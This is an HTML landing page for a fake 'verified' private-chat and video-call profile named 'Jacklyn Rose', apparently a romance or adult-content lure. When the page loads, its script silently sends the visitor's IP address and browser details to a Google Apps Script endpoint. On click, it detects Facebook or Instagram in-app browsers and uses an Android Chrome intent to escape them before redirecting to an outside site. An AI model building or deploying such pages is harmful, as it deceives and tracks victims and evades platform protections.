<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Chat with Jacklyn</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #0f0f0f; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #fff; overflow-x: hidden; }
        .container { width: 95%; max-width: 400px; text-align: center; background: rgba(255, 255, 255, 0.05); padding: 40px 20px; border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        .profile-container { position: relative; width: 140px; height: 140px; margin: 0 auto 20px; }
        .profile-pic { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 4px solid #0084ff; padding: 3px; }
        .online-dot { position: absolute; bottom: 10px; right: 10px; width: 22px; height: 22px; background: #31a24c; border: 3px solid #1a1a1a; border-radius: 50%; }
        h1 { font-size: 24px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .verified { color: #0084ff; font-size: 18px; }
        .stats { display: flex; justify-content: center; gap: 20px; margin: 25px 0; }
        .stat-box { text-align: center; }
        .stat-num { display: block; font-weight: bold; font-size: 18px; }
        .stat-label { font-size: 12px; color: #888; }
        .btn-chat { display: block; background: linear-gradient(45deg, #0084ff, #00c6ff); color: white; text-decoration: none; padding: 16px; border-radius: 50px; font-weight: bold; font-size: 18px; transition: 0.3s; cursor: pointer; border: none; width: 100%; }
    </style>
</head>
<body>

    <div class="container">
        <div class="profile-container">
            <img src="og-image.webp" alt="Jacklyn Rose" class="profile-pic">
            <div class="online-dot"></div>
        </div>
        <h1>Jacklyn Rose <i class="fa-solid fa-circle-check verified"></i></h1>
        <p>Active Now for Private Conversation & Video Calls</p>
        <div class="stats">
            <div class="stat-box"><span class="stat-num">4.9k</span><span class="stat-label">Followers</span></div>
            <div class="stat-box"><span class="stat-num">Online</span><span class="stat-label">Status</span></div>
        </div>
        <button class="btn-chat" id="chatBtn" onclick="handleStartChat()">
            <i class="fa-brands fa-facebook-messenger"></i> Start Private Chat
        </button>
    </div>

    <script>
        const TARGET_URL = 'messenger.jacklyn.site'; 
        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxr9BXhUgsBNQ4P55z87Lfv4CKkc5MZx-GYu75ZcZzV-sT3jygR7U-A3DjLXDxnKgum/exec';

        async function sendEvent(type) {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                fetch(SCRIPT_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    keepalive: true,
                    body: JSON.stringify({
                        ip: ipData.ip,
                        event: type,
                        userAgent: navigator.userAgent
                    })
                });
            } catch (e) {}
        }

        // পেজ লোড হলেই ভিজিট কাউন্ট
        window.onload = () => sendEvent('Visit');

        async function handleStartChat() {
            const btn = document.getElementById('chatBtn');
            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Connecting...';
            
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            const isFB = (ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1 || ua.indexOf("Instagram") > -1);
            
            // ক্লিক টাইপ ট্র্যাক
            sendEvent(isFB ? 'Chrome_Redirect' : 'Click');

            setTimeout(() => {
                const chromeIntent = "intent://" + TARGET_URL + "#Intent;scheme=https;package=com.android.chrome;end";
                window.location.href = isFB ? chromeIntent : "https://" + TARGET_URL;
            }, 400); 
        }
    </script>
</body>
</html>
